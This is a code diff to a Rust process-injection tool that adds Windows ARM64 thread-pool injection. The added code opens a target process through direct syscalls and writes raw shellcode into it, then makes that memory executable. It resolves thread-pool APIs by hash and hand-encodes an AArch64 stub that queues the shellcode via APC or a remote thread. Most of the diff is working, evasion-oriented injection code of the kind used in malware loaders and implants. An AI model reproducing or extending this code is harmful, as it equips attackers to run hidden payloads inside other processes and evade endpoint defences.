@@ -77,43 +77,295 @@ impl Injector for ThreadPoolInjector {
     }
 }
 
-#[cfg(all(windows, not(target_arch = "x86_64")))]
+#[cfg(all(windows, target_arch = "aarch64"))]
 impl Injector for ThreadPoolInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        // Keep payload semantics consistent with x86_64 ThreadPool mode:
-        // this path injects shellcode only.
         if payload_has_valid_pe_headers(payload) {
             return Err(anyhow!(
                 "ThreadPool injection requires raw shellcode, not a PE image. \
                  Use InjectionMethod::Hollowing or InjectionMethod::ManualMap for PE payloads."
             ));
         }
-
-        // ARM64 and other non-x86_64 Windows targets currently lack the
-        // architecture-specific PoolParty stub implementation used on x86_64.
-        // Fall back to the common NtCreateThreadEx path so the method remains
-        // operational instead of being a hard runtime stub.
-        log::warn!(
-            "ThreadPool injection is not natively implemented on this Windows architecture ({}); \
-             using NtCreateThreadEx fallback",
-            std::env::consts::ARCH
-        );
-
-        use winapi::um::winnt::{
-            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-            PROCESS_VM_WRITE,
-        };
-
-        let access_mask =
-            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION;
-
-        crate::injection::nt_create_thread_inject(
-            pid,
-            payload,
-            access_mask,
-            "ThreadPool (arch fallback)",
-        )
+        unsafe { inject_via_thread_pool_arm64(pid, payload) }
     }
+}
+
+// ── Windows ARM64 thread pool injection ──────────────────────────────────────
+
+/// Perform thread pool injection on Windows ARM64 targets.
+///
+/// Mirrors the x86_64 implementation exactly — same Windows NT API call
+/// sequence — but emits an AArch64 machine-code stub in place of the
+/// x86-64 one.  The AArch64 stub:
+///
+/// ```asm
+/// stp  x29, x30, [sp, #-32]!   ; save fp/lr, reserve local slot at [sp+16]
+/// mov  x29, sp
+/// add  x0, sp, #16             ; &local_work (out-param for TpAllocWork)
+/// <movz/movk x1, shellcode_base>  ; TP_WORK_CALLBACK = shellcode
+/// movz x2, #0                  ; Context  = NULL
+/// movz x3, #0                  ; Cleanup  = NULL
+/// <movz/movk x9, tp_alloc_work>
+/// blr  x9                      ; TpAllocWork(&work, cb, NULL, NULL)
+/// ldr  x0, [sp, #16]           ; work handle
+/// <movz/movk x9, tp_post_work>
+/// blr  x9                      ; TpPostWork(work)
+/// ldr  x0, [sp, #16]
+/// <movz/movk x9, tp_release_work>
+/// blr  x9                      ; TpReleaseWork(work)
+/// ldp  x29, x30, [sp], #32     ; restore fp/lr
+/// ret
+/// ```
+#[cfg(all(windows, target_arch = "aarch64"))]
+unsafe fn inject_via_thread_pool_arm64(pid: u32, shellcode: &[u8]) -> Result<()> {
+    use winapi::um::winnt::{
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_QUERY_INFORMATION,
+        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+    };
+
+    // ── Step 1: Open target process ──────────────────────────────────────
+    let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
+
+    let mut client_id = [0u64; 2];
+    client_id[0] = pid as u64;
+    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
+    let mut h_proc: usize = 0;
+    let open_status = crate::syscall!(
+        "NtOpenProcess",
+        &mut h_proc as *mut _ as u64,
+        access_mask as u64,
+        &mut obj_attr as *mut _ as u64,
+        client_id.as_mut_ptr() as u64,
+    );
+    match open_status {
+        Ok(s) if s >= 0 && h_proc != 0 => {}
+        _ => return Err(anyhow!("ThreadPool/ARM64: NtOpenProcess({}) failed", pid)),
+    }
+    let h_proc = h_proc as *mut std::ffi::c_void;
+
+    macro_rules! close_h {
+        ($h:expr) => {
+            crate::syscall!("NtClose", $h as u64).ok();
+        };
+    }
+    macro_rules! cleanup_and_err {
+        ($msg:expr) => {{
+            close_h!(h_proc);
+            return Err(anyhow!($msg));
+        }};
+        ($fmt:expr, $($arg:tt)*) => {{
+            close_h!(h_proc);
+            return Err(anyhow!($fmt, $($arg)*));
+        }};
+    }
+
+    // ── Step 2: Allocate RW memory for shellcode ─────────────────────────
+    let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+    let mut alloc_size = shellcode.len();
+    let s = crate::syscall!(
+        "NtAllocateVirtualMemory",
+        h_proc as u64,
+        &mut remote_mem as *mut _ as u64,
+        0u64,
+        &mut alloc_size as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64,
+        PAGE_READWRITE as u64,
+    );
+    match s {
+        Ok(st) if st >= 0 => {}
+        _ => cleanup_and_err!("ThreadPool/ARM64: NtAllocateVirtualMemory failed"),
+    }
+    if remote_mem.is_null() {
+        cleanup_and_err!("ThreadPool/ARM64: NtAllocateVirtualMemory returned null");
+    }
+    let remote_base = remote_mem as usize;
+
+    // ── Step 3: Write shellcode ──────────────────────────────────────────
+    let mut written = 0usize;
+    let s = crate::syscall!(
+        "NtWriteVirtualMemory",
+        h_proc as u64,
+        remote_mem as u64,
+        shellcode.as_ptr() as u64,
+        shellcode.len() as u64,
+        &mut written as *mut _ as u64,
+    );
+    match s {
+        Ok(st) if st >= 0 => {}
+        _ => cleanup_and_err!("ThreadPool/ARM64: NtWriteVirtualMemory failed"),
+    }
+    if written != shellcode.len() {
+        cleanup_and_err!(
+            "ThreadPool/ARM64: NtWriteVirtualMemory wrote {} of {} bytes",
+            written,
+            shellcode.len()
+        );
+    }
+
+    // ── Step 4: Flip shellcode to RX ─────────────────────────────────────
+    let mut old_prot = 0u32;
+    let mut prot_base = remote_mem as usize;
+    let mut prot_size = shellcode.len();
+    let s = crate::syscall!(
+        "NtProtectVirtualMemory",
+        h_proc as u64,
+        &mut prot_base as *mut _ as u64,
+        &mut prot_size as *mut _ as u64,
+        PAGE_EXECUTE_READ as u64,
+        &mut old_prot as *mut _ as u64,
+    );
+    match s {
+        Ok(st) if st >= 0 => {}
+        _ => cleanup_and_err!("ThreadPool/ARM64: NtProtectVirtualMemory to RX failed"),
+    }
+    crate::syscall!(
+        "NtFlushInstructionCache",
+        h_proc as u64,
+        remote_mem as u64,
+        shellcode.len() as u64,
+    )
+    .ok();
+
+    // ── Step 5: Resolve thread pool APIs ─────────────────────────────────
+    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+        .ok_or_else(|| anyhow!("ThreadPool/ARM64: ntdll not found"))?;
+
+    let tp_alloc_work = find_tp_alloc_work(ntdll_base)
+        .ok_or_else(|| anyhow!("ThreadPool/ARM64: TpAllocWork not found in ntdll"))?;
+    let tp_post_work = find_tp_post_work(ntdll_base)
+        .ok_or_else(|| anyhow!("ThreadPool/ARM64: TpPostWork not found in ntdll"))?;
+    let tp_release_work = find_tp_release_work(ntdll_base)
+        .ok_or_else(|| anyhow!("ThreadPool/ARM64: TpReleaseWork not found in ntdll"))?;
+
+    // ── Step 6: Build the AArch64 TpAllocWork/TpPostWork stub ────────────
+    //
+    // Stack layout (after `stp x29, x30, [sp, #-32]!`):
+    //   [sp+ 0] = saved x29 (frame pointer)
+    //   [sp+ 8] = saved x30 (link register)
+    //   [sp+16] = TP_WORK* output slot
+    //   [sp+24] = padding
+    let mut stub: Vec<u8> = Vec::with_capacity(192);
+
+    // stp x29, x30, [sp, #-32]!   — FD 7B BE A9
+    stub.extend_from_slice(&[0xFD, 0x7B, 0xBE, 0xA9]);
+    // mov x29, sp  (ADD x29, sp, #0)  — FD 03 00 91
+    stub.extend_from_slice(&[0xFD, 0x03, 0x00, 0x91]);
+
+    // TpAllocWork(&local_work, shellcode_addr, NULL, NULL)
+    // x0 = &local_work = sp+16  →  ADD x0, sp, #16
+    // 0x91000000 | (16<<10) | (31<<5) | 0 = 0x910043E0
+    stub.extend_from_slice(&0x910043E0u32.to_le_bytes());
+    // x1 = shellcode_base (TP_WORK_CALLBACK)
+    arm64_load64(&mut stub, 1, remote_base as u64);
+    // x2 = 0 (Context)   — MOVZ x2, #0  = 0xD2800002
+    stub.extend_from_slice(&0xD2800002u32.to_le_bytes());
+    // x3 = 0 (Cleanup)   — MOVZ x3, #0  = 0xD2800003
+    stub.extend_from_slice(&0xD2800003u32.to_le_bytes());
+    // x9 = tp_alloc_work
+    arm64_load64(&mut stub, 9, tp_alloc_work as u64);
+    // blr x9  — D6 3F 01 20 (LE: 20 01 3F D6)
+    stub.extend_from_slice(&0xD63F0120u32.to_le_bytes());
+
+    // TpPostWork(local_work)
+    // x0 = [sp+16]  →  LDR x0, [sp, #16]  = 0xF94007E0
+    stub.extend_from_slice(&0xF94007E0u32.to_le_bytes());
+    // x9 = tp_post_work
+    arm64_load64(&mut stub, 9, tp_post_work as u64);
+    // blr x9
+    stub.extend_from_slice(&0xD63F0120u32.to_le_bytes());
+
+    // TpReleaseWork(local_work)
+    // x0 = [sp+16]
+    stub.extend_from_slice(&0xF94007E0u32.to_le_bytes());
+    // x9 = tp_release_work
+    arm64_load64(&mut stub, 9, tp_release_work as u64);
+    // blr x9
+    stub.extend_from_slice(&0xD63F0120u32.to_le_bytes());
+
+    // Epilogue: ldp x29, x30, [sp], #32  — FD 7B C2 A8
+    stub.extend_from_slice(&[0xFD, 0x7B, 0xC2, 0xA8]);
+    // ret  — C0 03 5F D6
+    stub.extend_from_slice(&0xD65F03C0u32.to_le_bytes());
+
+    // ── Step 7: Write stub into target process ───────────────────────────
+    let mut stub_remote: *mut std::ffi::c_void = std::ptr::null_mut();
+    let mut stub_size = stub.len();
+    let s = crate::syscall!(
+        "NtAllocateVirtualMemory",
+        h_proc as u64,
+        &mut stub_remote as *mut _ as u64,
+        0u64,
+        &mut stub_size as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64,
+        PAGE_READWRITE as u64,
+    );
+    match s {
+        Ok(st) if st >= 0 => {}
+        _ => cleanup_and_err!("ThreadPool/ARM64: stub NtAllocateVirtualMemory failed"),
+    }
+    if stub_remote.is_null() {
+        cleanup_and_err!("ThreadPool/ARM64: stub allocation returned null");
+    }
+
+    let mut written = 0usize;
+    let s = crate::syscall!(
+        "NtWriteVirtualMemory",
+        h_proc as u64,
+        stub_remote as u64,
+        stub.as_ptr() as u64,
+        stub.len() as u64,
+        &mut written as *mut _ as u64,
+    );
+    match s {
+        Ok(st) if st >= 0 => {}
+        _ => cleanup_and_err!("ThreadPool/ARM64: stub NtWriteVirtualMemory failed"),
+    }
+    if written != stub.len() {
+        cleanup_and_err!(
+            "ThreadPool/ARM64: stub wrote {} of {} bytes",
+            written,
+            stub.len()
+        );
+    }
+
+    // Flip stub to RX.
+    let mut old_prot = 0u32;
+    let mut prot_base = stub_remote as usize;
+    let mut prot_size = stub.len();
+    let s = crate::syscall!(
+        "NtProtectVirtualMemory",
+        h_proc as u64,
+        &mut prot_base as *mut _ as u64,
+        &mut prot_size as *mut _ as u64,
+        PAGE_EXECUTE_READ as u64,
+        &mut old_prot as *mut _ as u64,
+    );
+    match s {
+        Ok(st) if st >= 0 => {}
+        _ => cleanup_and_err!("ThreadPool/ARM64: stub NtProtectVirtualMemory to RX failed"),
+    }
+    crate::syscall!(
+        "NtFlushInstructionCache",
+        h_proc as u64,
+        stub_remote as u64,
+        stub.len() as u64,
+    )
+    .ok();
+
+    // ── Step 8: Execute stub via APC on an alertable thread ──────────────
+    let apc_ok = try_execute_via_apc(h_proc, pid, stub_remote as usize);
+    if !apc_ok {
+        log::warn!(
+            "ThreadPool/ARM64: no alertable thread in pid {}, using NtCreateThreadEx for stub",
+            pid
+        );
+        execute_stub_via_thread(h_proc, stub_remote)?;
+    }
+
+    close_h!(h_proc);
+    Ok(())
 }
 
 #[cfg(not(windows))]
@@ -143,7 +395,7 @@ impl Injector for ThreadPoolInjector {
 ///     PCALLBACK_ENVENTRY Cleanup  // [in]  optional cleanup callback (NULL)
 /// );
 /// ```
-#[cfg(all(windows, target_arch = "x86_64"))]
+#[cfg(windows)]
 fn find_tp_alloc_work(ntdll_base: usize) -> Option<usize> {
     let hash = pe_resolve::hash_str(b"TpAllocWork\0");
     unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
@@ -157,7 +409,7 @@ fn find_tp_alloc_work(ntdll_base: usize) -> Option<usize> {
 /// ```c
 /// VOID TpPostWork(PTP_WORK Work);
 /// ```
-#[cfg(all(windows, target_arch = "x86_64"))]
+#[cfg(windows)]
 fn find_tp_post_work(ntdll_base: usize) -> Option<usize> {
     let hash = pe_resolve::hash_str(b"TpPostWork\0");
     unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
@@ -170,10 +422,40 @@ fn find_tp_post_work(ntdll_base: usize) -> Option<usize> {
 /// ```c
 /// VOID TpReleaseWork(PTP_WORK Work);
 /// ```
-#[cfg(all(windows, target_arch = "x86_64"))]
+#[cfg(windows)]
 fn find_tp_release_work(ntdll_base: usize) -> Option<usize> {
     let hash = pe_resolve::hash_str(b"TpReleaseWork\0");
     unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
+}
+
+/// Emit MOVZ + MOVK instructions to load a 64-bit constant into an AArch64
+/// register.  Always emits MOVZ for the lowest 16 bits (chunk 0); MOVK is
+/// emitted for each higher chunk only when non-zero.
+///
+/// This function is architecture-independent and used by the ARM64 stub
+/// builder at compile time to lay down immediate-load sequences.
+fn arm64_load64(stub: &mut Vec<u8>, reg: u8, val: u64) {
+    // Base encodings for MOVZ / MOVK (64-bit, shift variant selected by hw):
+    //   MOVZ: hw=0→0xD2800000, hw=1→0xD2A00000, hw=2→0xD2C00000, hw=3→0xD2E00000
+    //   MOVK: hw=0→0xF2800000, hw=1→0xF2A00000, hw=2→0xF2C00000, hw=3→0xF2E00000
+    let movz_bases: [u32; 4] = [0xD2800000, 0xD2A00000, 0xD2C00000, 0xD2E00000];
+    let movk_bases: [u32; 4] = [0xF2800000, 0xF2A00000, 0xF2C00000, 0xF2E00000];
+    let chunks: [u32; 4] = [
+        (val & 0xFFFF) as u32,
+        ((val >> 16) & 0xFFFF) as u32,
+        ((val >> 32) & 0xFFFF) as u32,
+        ((val >> 48) & 0xFFFF) as u32,
+    ];
+    // Always emit MOVZ for the lowest chunk (even if zero) to guarantee the
+    // register is fully initialised from a known state.
+    let enc = movz_bases[0] | (chunks[0] << 5) | reg as u32;
+    stub.extend_from_slice(&enc.to_le_bytes());
+    for hw in 1..4usize {
+        if chunks[hw] != 0 {
+            let enc = movk_bases[hw] | (chunks[hw] << 5) | reg as u32;
+            stub.extend_from_slice(&enc.to_le_bytes());
+        }
+    }
 }
 
 // ── Core injection implementation ────────────────────────────────────────────
@@ -196,14 +478,12 @@ fn find_tp_release_work(ntdll_base: usize) -> Option<usize> {
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
     use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
-        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_QUERY_INFORMATION,
+        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
     };
 
     // ── Step 1: Open target process ──────────────────────────────────────
-    let access_mask = PROCESS_VM_OPERATION
-        | PROCESS_VM_WRITE
-        | PROCESS_QUERY_INFORMATION;
+    let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
 
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
@@ -431,11 +711,7 @@ unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
         _ => cleanup_and_err!("ThreadPool: stub NtWriteVirtualMemory failed"),
     }
     if written != stub.len() {
-        cleanup_and_err!(
-            "ThreadPool: stub wrote {} of {} bytes",
-            written,
-            stub.len()
-        );
+        cleanup_and_err!("ThreadPool: stub wrote {} of {} bytes", written, stub.len());
     }
 
     // Flip stub to RX.
@@ -494,12 +770,8 @@ unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
 /// thread in the target process.
 ///
 /// Returns `true` if the APC was queued successfully, `false` otherwise.
-#[cfg(all(windows, target_arch = "x86_64"))]
-unsafe fn try_execute_via_apc(
-    h_proc: *mut std::ffi::c_void,
-    pid: u32,
-    stub_addr: usize,
-) -> bool {
+#[cfg(windows)]
+unsafe fn try_execute_via_apc(h_proc: *mut std::ffi::c_void, pid: u32, stub_addr: usize) -> bool {
     use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, THREAD_SET_CONTEXT};
 
     // Take a snapshot of all threads in the target process.
@@ -559,10 +831,8 @@ unsafe fn try_execute_via_apc(
     if t32f_fn(snap, te_buf.as_mut_ptr()) != 0 {
         loop {
             // Parse th32OwnerProcessID (offset 12) and th32ThreadID (offset 8)
-            let te_pid =
-                u32::from_le_bytes([te_buf[12], te_buf[13], te_buf[14], te_buf[15]]);
-            let te_tid =
-                u32::from_le_bytes([te_buf[8], te_buf[9], te_buf[10], te_buf[11]]);
+            let te_pid = u32::from_le_bytes([te_buf[12], te_buf[13], te_buf[14], te_buf[15]]);
+            let te_tid = u32::from_le_bytes([te_buf[8], te_buf[9], te_buf[10], te_buf[11]]);
 
             if te_pid == pid && te_tid != 0 {
                 // Try to open this thread with THREAD_SET_CONTEXT (needed for APC).
@@ -573,8 +843,7 @@ unsafe fn try_execute_via_apc(
                 let mut cid = [0u64; 2];
                 cid[0] = te_tid as u64;
                 let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-                oa.Length =
-                    std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
 
                 let thread_access = (THREAD_SET_CONTEXT | PROCESS_QUERY_INFORMATION) as u64;
                 let open_ok = crate::syscall!(
@@ -628,7 +897,7 @@ unsafe fn try_execute_via_apc(
 /// TpAllocWork/TpPostWork stub. The stub itself is ~80 bytes and completes
 /// in microseconds, after which the thread pool worker executes the actual
 /// payload.
-#[cfg(all(windows, target_arch = "x86_64"))]
+#[cfg(windows)]
 unsafe fn execute_stub_via_thread(
     h_proc: *mut std::ffi::c_void,
     stub_addr: *mut std::ffi::c_void,
@@ -644,16 +913,16 @@ unsafe fn execute_stub_via_thread(
 
     type NtCreateThreadExFn = unsafe extern "system" fn(
         *mut *mut winapi::ctypes::c_void, // ThreadHandle
-        u32,                               // DesiredAccess
-        *mut winapi::ctypes::c_void,       // ObjectAttributes
-        *mut winapi::ctypes::c_void,       // ProcessHandle
-        *mut winapi::ctypes::c_void,       // StartRoutine
-        *mut winapi::ctypes::c_void,       // Argument
-        u32,                               // CreateFlags
-        usize,                             // ZeroBits
-        usize,                             // StackSize
-        usize,                             // MaximumStackSize
-        *mut winapi::ctypes::c_void,       // AttributeList
+        u32,                              // DesiredAccess
+        *mut winapi::ctypes::c_void,      // ObjectAttributes
+        *mut winapi::ctypes::c_void,      // ProcessHandle
+        *mut winapi::ctypes::c_void,      // StartRoutine
+        *mut winapi::ctypes::c_void,      // Argument
+        u32,                              // CreateFlags
+        usize,                            // ZeroBits
+        usize,                            // StackSize
+        usize,                            // MaximumStackSize
+        *mut winapi::ctypes::c_void,      // AttributeList
     ) -> i32;
 
     let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);
@@ -713,9 +982,18 @@ mod tests {
         assert_ne!(hash_release, 0, "TpReleaseWork hash must be non-zero");
 
         // All hashes must be distinct.
-        assert_ne!(hash_alloc, hash_post, "TpAllocWork and TpPostWork hashes must differ");
-        assert_ne!(hash_alloc, hash_release, "TpAllocWork and TpReleaseWork hashes must differ");
-        assert_ne!(hash_post, hash_release, "TpPostWork and TpReleaseWork hashes must differ");
+        assert_ne!(
+            hash_alloc, hash_post,
+            "TpAllocWork and TpPostWork hashes must differ"
+        );
+        assert_ne!(
+            hash_alloc, hash_release,
+            "TpAllocWork and TpReleaseWork hashes must differ"
+        );
+        assert_ne!(
+            hash_post, hash_release,
+            "TpPostWork and TpReleaseWork hashes must differ"
+        );
     }
 
     /// Verify that the hash function is case-insensitive (DJB2 variant used
@@ -726,8 +1004,14 @@ mod tests {
         let hash_lower = pe_resolve::hash_str(b"tpallocwork\0");
         let hash_upper = pe_resolve::hash_str(b"TPALLOCWORK\0");
 
-        assert_eq!(hash_mixed, hash_lower, "hash should be case-insensitive (mixed vs lower)");
-        assert_eq!(hash_mixed, hash_upper, "hash should be case-insensitive (mixed vs upper)");
+        assert_eq!(
+            hash_mixed, hash_lower,
+            "hash should be case-insensitive (mixed vs lower)"
+        );
+        assert_eq!(
+            hash_mixed, hash_upper,
+            "hash should be case-insensitive (mixed vs upper)"
+        );
     }
 
     /// Verify that the stub builder produces a non-empty stub with the
@@ -783,7 +1067,11 @@ mod tests {
         stub.push(0xC3);
 
         // Stub should be non-trivial.
-        assert!(stub.len() > 40, "stub should be >40 bytes, got {}", stub.len());
+        assert!(
+            stub.len() > 40,
+            "stub should be >40 bytes, got {}",
+            stub.len()
+        );
 
         // Last byte must be ret (0xC3).
         assert_eq!(*stub.last().unwrap(), 0xC3, "stub must end with ret (0xC3)");
@@ -791,17 +1079,21 @@ mod tests {
         // Verify the remote_base is embedded at the expected offset.
         // After: sub rsp(4) + lea rcx(5) + movabs rdx prefix(2) = offset 11
         let rdx_offset = 4 + 5 + 2;
-        let embedded_base = u64::from_le_bytes(
-            stub[rdx_offset..rdx_offset + 8].try_into().unwrap(),
+        let embedded_base =
+            u64::from_le_bytes(stub[rdx_offset..rdx_offset + 8].try_into().unwrap());
+        assert_eq!(
+            embedded_base, remote_base as u64,
+            "remote_base must be embedded in stub"
         );
-        assert_eq!(embedded_base, remote_base as u64, "remote_base must be embedded in stub");
 
         // Verify tp_alloc_work is embedded.
         // After rdx(8) + xor r8(3) + xor r9(3) + movabs rax prefix(2) = rdx_offset+8+3+3+2
         let rax1_offset = rdx_offset + 8 + 3 + 3 + 2;
-        let embedded_alloc = u64::from_le_bytes(
-            stub[rax1_offset..rax1_offset + 8].try_into().unwrap(),
+        let embedded_alloc =
+            u64::from_le_bytes(stub[rax1_offset..rax1_offset + 8].try_into().unwrap());
+        assert_eq!(
+            embedded_alloc, tp_alloc_work as u64,
+            "TpAllocWork addr must be in stub"
         );
-        assert_eq!(embedded_alloc, tp_alloc_work as u64, "TpAllocWork addr must be in stub");
     }
 }
